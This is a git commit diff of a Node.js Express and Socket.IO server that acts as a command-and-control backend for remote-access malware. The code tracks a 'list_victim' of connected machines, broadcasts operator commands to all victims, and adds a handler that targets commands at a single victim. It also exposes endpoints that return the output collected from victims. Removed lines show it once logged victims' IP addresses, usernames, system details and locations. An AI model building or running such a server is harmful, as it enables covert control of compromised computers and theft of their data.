2f9acbef63d8be3bb3582736a1b069f64dff86a7
DMQuan03 <123900871+DMQuan03@users.noreply.github.com>
2025-01-13 10:12:32 +0700

    Update server.js

--- server.js
+++ server.js
@@ -10,86 +10,117 @@ require("dotenv").config()
 const PORT = 5678
 app.use(cors())
 app.use(express.json())
-
-db()
-init_router(app)
-
 const all_data = []
-app.use("/command/data", (req , res) => {
+app.use("/command/data", (req, res) => {
   try {
     res.status(200).json({
-      success : true,
-      data : all_data
+      success: true,
+      data: all_data
     })
     while (all_data.length > 0) {
       all_data.pop()
     }
     return 1
-  }catch(err) {
+  } catch (err) {
     return res.status(500).json({
-      success : false, 
-      message : "error from server"
+      success: false,
+      message: "error from server"
     })
   }
 })
 
-const server = app.listen(PORT , () => {
+const all_data_only = []
+
+app.use("/data/only", (req, res) => {
+  try {
+    res.status(200).json({
+      success: true,
+      data: all_data_only
+    })
+    while (all_data_only.length > 0) {
+      all_data_only.pop()
+    }
+    return 1
+  } catch (err) {
+    return res.status(500).json({
+      success: false,
+      message: "error from server"
+    })
+  }
+})
+
+const server = app.listen(PORT, () => {
   console.log(`server is running ${PORT}`)
 })
 
 const io = socket(server, {
-  cors : {
-        origin : "*",
-        credentials : true,
-        methods : ["GET", "PUT", 'PATCH', 'DELETE', 'POST']
-    }
-  })
+  cors: {
+    origin: "*",
+    credentials: true,
+    methods: ["GET", "PUT", 'PATCH', 'DELETE', 'POST']
+  }
+})
 
+const getFormattedDate = () => {
+  const now = new Date();
+
+  const day = now.getDate();
+  const month = now.getMonth() + 1; // Months are 0-indexed, so add 1
+  const year = now.getFullYear();
+  const hours = now.getHours();
+  const minutes = now.getMinutes();
+  const seconds = now.getSeconds();
+
+  // Format the date in Vietnamese language
+  const formattedDate = `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
+
+  return formattedDate;
+}
+
+let list_victim = [
+]
 
 io.on("connection", (socket) => {
+  console.log("user connected")
+  list_victim.push({
+    id: socket.id,
+    date: getFormattedDate()
+  })
+  socket.broadcast.emit("victimConnectToServer", { data: list_victim })
   socket.on("command", (data) => {
-      socket.broadcast.emit("server_send_command", data)
+    socket.broadcast.emit("server_send_command", data)
   })
-  socket.on("information", async(data) => {
-      try {
-        console.log(`user connected ${socket.ip}`)
-        socket.broadcast.emit("victimConnected", {ip : socket.ip})
-      } catch(err) {
-        console.log(err.message)
-      }
-      // const check_user = await USER.findOne({ip_address : data.data[5]})
-      // socket.ip = data.data[5]
-      // if (check_user) {
-      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {online : true}}, {new : true})
-      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$inc : {session : 1}}, {new : true})
-      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {lng : data.data[6].lon || 21.0292}}, {new : true})
-      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {lat : data.data[6].lat || 105.8526}}, {new : true})
-      // }else {
-      //   const newUser = await new USER({
-      //     ip_address : data.data[5],
-      //     system : data.data[0],
-      //     release : data.data[1],
-      //     version : data.data[2],
-      //     machine : data.data[3],
-      //     user_name : data.data[4],
-      //     lng : data.data[6].lon,
-      //     lat : data.data[6].lat,
-      //     online : true
-      //   })
-      //   newUser.save()
-      // }
-  })
-  socket.on("send_data_command", (data) => {
+  // socket.on("information", async (data) => {
+  //   list_victim.push({
+  //     id: socket.id,
+  //     date: getFormattedDate()
+  //   })
+  //   socket.broadcast.emit("victimConnectToServer", { data: list_victim })
+  // })
+  socket.on("send_data_all_user", (data) => {
     all_data.push(data)
   })
 
-  
-  socket.on("disconnect", async() => {
-    console.log("user ip disconnected" + socket.ip)
-    await USER.findOneAndUpdate({ip_address : socket.ip}, {
-      $set : {
-        online : false
-      }
-    })
+
+  socket.on("send_to_only", (data) => {
+    try {
+      socket.to(data.id).emit("server_send_to_only_you", data.cmd)
+    } catch {
+      console.log("err")
+    }
+  })
+
+  socket.on("only_to_all", (data) => {
+    try {
+      all_data_only.push(data)
+    } catch (err) {
+      console.log(err)
+    }
+  })
+
+  socket.on("disconnect", async () => {
+    console.log("user ip disconnected" + socket.id)
+    list_victim = list_victim.filter(item => item.id !== socket.id);
+    socket.broadcast.emit("victimConnectToServer", { data: list_victim })
   })
 })
